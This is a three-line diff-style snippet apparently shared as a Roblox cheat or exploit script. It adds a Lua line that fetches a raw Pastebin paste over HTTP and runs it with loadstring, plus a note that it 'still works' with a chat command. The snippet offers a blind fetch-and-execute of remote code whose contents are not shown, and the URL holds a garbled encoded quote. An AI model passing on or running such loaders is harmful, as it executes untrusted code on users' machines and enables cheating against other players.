@@ -1,0 +1,3 @@
+loadstring(game:HttpGet(('https://pastebin.com/raw/ncWQn5CT%27),true))()
+
+still works use /e then message
